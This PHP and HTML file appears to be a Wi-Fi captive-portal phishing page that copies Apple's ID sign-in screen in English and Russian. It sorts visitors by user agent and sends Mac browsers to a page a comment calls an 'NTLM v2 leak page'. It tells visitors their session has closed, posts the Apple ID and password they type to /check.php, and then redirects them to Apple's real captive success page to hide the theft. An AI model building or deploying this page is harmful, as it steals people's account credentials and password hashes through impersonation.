<?php
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    // echo $user_agent;

    if (preg_match("/i(Pad|Pod|Phone)/", $user_agent)) {
        //echo "<br/>This is Apple Mobile device";
    }
    else {
        if (preg_match("/Mac OS/", $user_agent)) {
            if (preg_match("/(Safari|Firefox)/", $user_agent)) {
                // echo "<br/>This is Apple Browser";
                // redirect to NTLM v2 leak page
                header("Location: /leak.php");
            }
            else {
                // echo "<br/>This is Apple Captive form";
                sleep(1);
                // redirect to MacOS native form
                header("Location: /macos_native/");
            }
        }

    }
    //exit(0);

    $title = "Sign In - Apple";
    $intro = "Your session is closed sign in with your Apple ID";
    $remember = "Remember me";
    $error_msg = "Your Apple&nbsp;ID or password was incorrect.";
    $pass_placeholder = "Password";
    $copyright = "Copyright © 2018 Apple Inc. All rights reserved.";
    $country = "United States";
    $country_img = "/static/images/AppleConnect/22x22/USflag.png";

    if ($_GET['lang'] == 'ru') {
        $title = "Войти - Apple";
        $intro = "Ваша сессия истекла, для возобновления используйте Apple ID";
        $remember = "Запомнить меня";
        $error_msg = "Неверный Apple&nbsp;ID или пароль.";
        $pass_placeholder = "Пароль";
        $copyright = "Copyright © 2018 Apple Inc. Все права защищены.";
        $country = "Россия"; 
        $country_img = "/static/images/AppleConnect/22x22/RUflag.png";
    }
?>
<html>
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="/static/images/favicon.ico" type="image/X-icon">
    <title><?php echo $title; ?></title>
    <meta name="viewport" content="initial-scale=1.0">
    <meta name="Author" content="Apple Inc.">
    <meta name="Description" content="Вход в систему с Apple ID">
    <meta name="Title" content="Вход в систему с Apple ID">
    <link rel="stylesheet" type="text/css" href="/static/css/ac-globalfooter.built.css">
    <link rel="stylesheet" type="text/css" href="/static/css/embedLogin.css">
    <style>
            .wrapper {
                margin-top: -44px;
                padding-top: 44px;
            }
    </style>
    <link rel="stylesheet" href="/static/css/fonts.css" type="text/css">
    <link rel="stylesheet" href="/static/css/app.css" type="text/css">
    <link rel="stylesheet" href="/static/css/ac-globalnav.built.css" type="text/css">
    <script type="text/javascript">
        /*document.getElementById("password_text_field").addEventListener("keyup", function(event) {
            event.preventDefault();
            if (event.keyCode === 13) {
                document.getElementById("sign-in").click();
            }
        });*/

        function CheckCreds() {
            ShowSpinner();
            var login = document.getElementsByName('login')[0].value
            var password = document.getElementsByName('password')[0].value
            var result = "";

            var xhr = new XMLHttpRequest();
            var body = 'login=' + login + '&password=' + password;

            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    result = xhr.responseText;
                    HideSpinner();
                    if (result == "ERROR") {
                        ShowError();
                    }
                    else if (result == "OK") {
                        window.location.href = "http://captive.apple.com/success.html";
                    }
                    else {
                        ShowError();
                    }
                }
            }            
            xhr.open("POST", '/check.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send(body);
        }
        function ShowError() {
            document.getElementsByName('error-form')[0].style.display = 'block';
        }
        function HideError() {
            document.getElementsByName('error-form')[0].style.display = 'none';
        }
        function ShowSpinner() {
            document.getElementById("sign-in-icon").classList.add('hide');
            document.getElementById("spinner").classList.remove('hide');
        }
        function HideSpinner() {
            document.getElementById("sign-in-icon").classList.remove('hide');
            document.getElementById("spinner").classList.add('hide');
        }

    </script>
</head>
<body style="background-color: #FFFFFF" data-theme="gray">

<nav id="ac-globalnav" class="js no-touch flexbox" role="navigation" aria-label="Глобальная навигация" data-hires="false" data-analytics-region="global nav" lang="ru-RU" dir="ltr" data-store-locale="ru" data-store-api="/[storefront]/shop/bag/status" data-search-locale="ru_RU" data-search-api="/search-services/suggestions/">
    <div class="ac-gn-content">
        <ul class="ac-gn-header">
            <li class="ac-gn-item ac-gn-menuicon">
                <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
                    <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
                        <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                    </span>
                    <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
                        <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                    </span>
                </label>
                <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
                    <span class="ac-gn-menuanchor-label">Открыть меню</span>
                </a>
                <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
                    <span class="ac-gn-menuanchor-label">Закрыть меню</span>
                </a>
            </li>
            <li class="ac-gn-item ac-gn-apple">
                <a class="ac-gn-link ac-gn-link-apple" href="/#" data-analytics-title="apple home" id="ac-gn-firstfocus-small">
                    <span class="ac-gn-link-text">Apple</span>
                </a>
            </li>
            <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
                <a class="ac-gn-link ac-gn-link-bag" href="/#" data-analytics-title="bag" data-analytics-click="bag" aria-label="Корзина" data-string-badge="Корзина для покупок с товарами">
                    <span class="ac-gn-link-text">WiFi</span>
                    <span class="ac-gn-bag-badge"></span>
                </a>
                <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
            </li>
        </ul>
        <ul class="ac-gn-list">
            <li class="ac-gn-item ac-gn-apple">
                <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
                    <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
                        <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                    </span>
                    <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
                        <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                    </span>
                </label>
                <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
                    <span class="ac-gn-menuanchor-label">Открыть меню</span>
                </a>
                <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
                    <span class="ac-gn-menuanchor-label">Закрыть меню</span>
                </a>
            </li>

            <li class="ac-gn-item ac-gn-apple">
                <a class="ac-gn-link ac-gn-link-apple" href="/#" data-analytics-title="apple home" id="ac-gn-firstfocus">
                    <span class="ac-gn-link-text">Apple</span>
                </a>
            </li>
            <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
                <a class="ac-gn-link ac-gn-link-bag" href="/#" data-analytics-title="bag" data-analytics-click="bag" aria-label="Корзина" data-string-badge="Wifi">
                    <span class="ac-gn-link-text">WiFi</span>
                    <span class="ac-gn-bag-badge" aria-hidden="true"></span>
                </a>
                <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
            </li>
        </ul>
    </div>
</nav>
<div class="si-body si-container container-fluid" id="content" data-theme="dark">
    <apple-auth app-loading-defaults="{appLoadingDefaults}">
        <div class="widget-container fade-in safari-browser restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
            <div id="step" class="si-step ">
                <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn">
                </logo>
                <div id="stepEl" class="   ">
                    <sign-in suppress-iforgot="{suppressIforgot}" {on-test-idp}="@_onTestIdp">
                    <!--<form action="/check.php" method="POST">-->
                        <div class="signin fade-in" id="signin">
                            <h1 tabindex="-1" class="si-container-title tk-intro ">
                                <?php echo $intro; ?>
                            </h1>
                            <div class="container si-field-container password-second-step password-on">
                                <div id="sign_in_form" class="signin-form fed-auth show-password ">
                                    <div class="si-field-container container">
                                        <div class="form-table">
                                            <div class="ax-vo-border show-password"></div>
                                            <div class="account-name form-row     show-password ">
                                                <label class="sr-only form-cell form-label" for="account_name_text_field">Apple ID</label>
                                                <div class="form-cell">
                                                    <div class="form-cell-wrapper">
                                                        <input type="text" class="form-textbox form-textbox-text"
                                                               id="account_name_text_field" can-field="accountName"
                                                               autocomplete="off" autocorrect="off" autocapitalize="off"
                                                               aria-required="true" required="required"
                                                               aria-describedby="apple_id_field_label"
                                                               spellcheck="false" autofocus=""
                                                               placeholder="Apple ID" name="login" 
                                                               onkeydown="HideError();">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="field-separator"></div>

                                            <div class="password form-row show-password show-placeholder">
                                                <label class="sr-only form-cell form-label" for="password_text_field">Password</label>
                                                <div class="form-cell">
                                                    <div class="form-cell-wrapper">
                                                        <input type="password" class="form-textbox form-textbox-text"
                                                               id="password_text_field"
                                                               aria-required="true" required="required"
                                                               can-field="password" autocomplete="off"
                                                               placeholder="<?php echo $pass_placeholder; ?>" name="password" 
                                                               onkeydown="HideError();">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <!-- ERROR -->
                                <div name="error-form" class="pop-container error signin-error" style="display: none;">
                                    <div class="error pop-bottom tk-subbody-headline">
                                        <p class="fat" id="errMsg">
                                            <?php echo $error_msg ?>
                                        </p>
                                        <!--<a class="si-link ax-outline thin tk-subbody" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
                                                              Забыли пароль?
                                        </a>-->            
                                    </div>
                                </div>

                                <div class="si-remember-password">
                                    <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox"
                                           {($checked)}="isRememberMeChecked">
                                    <label id="remember-me-label" class="form-label" for="remember-me">
                                        <span class="form-choice-indicator"></span>
                                        <?php echo $remember; ?>
                                    </label>
                                </div>
                                <!--<div id="spinner" class="spinner-container auth show">
                                    <div class="spinner" role="progressbar">
                                        <img src="/static/images/spinner.gif" style="position: absolute; width: 33px; z-index: 2000000000; left: 50%; top: 50%;">
                                    </div>
                                </div>-->
                                <button id="sign-in" tabindex="0"
                                        class="si-button btn fed-ui moved fed-ui-animation-show remember-me link"
                                        aria-label="Sign in" aria-disabled="false" onclick="javascript:CheckCreds();">
                                    <i id="sign-in-icon" class="icon icon_sign_in"></i>
                                    <img id="spinner" class="hide" src="/static/images/spinner.gif" width="30px" height="30px">
                                    <span class="text feat-split"> Sign in </span>

                                </button>
                                <button id="sign-in-cancel" ($click)="_signInCancel($element)" aria-label="Close"
                                        aria-disabled="false" tabindex="0"
                                        class="si-button btn secondary feat-split  remember-me   link ">
                                    <span class="text">Close</span>
                                </button>
                            </div>
                            <!--<div class="si-container-footer">
                                <div class="separator "></div>
                                <div class="links tk-subbody">
                                    <div class="si-forgot-password">
                                        <a id="iforgot-link" class="si-link ax-outline lite-theme-override"
                                           ($click)="iforgotLinkClickHandler($element)"
                                           href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
                                            Забыли Apple&nbsp;ID или пароль?
                                        </a>

                                    </div>

                                    <div>
                                        <span class="fat">Нет Apple&nbsp;ID?</span>
                                        <a id="create-link"
                                           class="si-forgot-password si-link ax-outline lite-theme-override"
                                           ($click)="createLinkClickHandler($element)"
                                           href="https://appleid.apple.com/account?appId=21&amp;returnUrl=https%3A%2F%2Fbugreport.apple.com"
                                           target="_blank">
                                            Создайте сейчас.
                                        </a>
                                    </div>
                                </div>
                            </div>-->
                        </div>
                    <!--</form>-->
                    </sign-in>
                </div>
            </div>
        </div>
    </apple-auth>
</div>
</div>
<style type="text/css">
    #ac-globalfooter {
        position:absolute;
        bottom:0;
        width:100%;
        height:60px;
    }      
</style>

<footer lang="ru-RU" aria-labelledby="ac-gf-label" role="contentinfo" data-analytics-region="global footer"
        class="js no-touch svg no-oldie no-ie global-footer" id="ac-globalfooter">
    <div class="ac-gf-content">
        <section class="ac-gf-footer">
            <div class="ac-gf-footer-locale">
                <img styleclass="ac-gf-footer-locale-flag"
                     src="<?php echo $country_img; ?>"
                     alt="Choose your country or region" title="Choose your country or region" width="16" height="16">
                <a class="ac-gf-footer-locale-link" title="Choose your country or region">
                    <?php echo $country; ?>
                </a>

            </div>
            <div class="ac-gf-footer-legal">
                <div class="ac-gf-footer-legal-copyright">
                    <?php echo $copyright; ?>
                </div>
            </div>
        </section>
    </div>
</footer>
</body>
</html>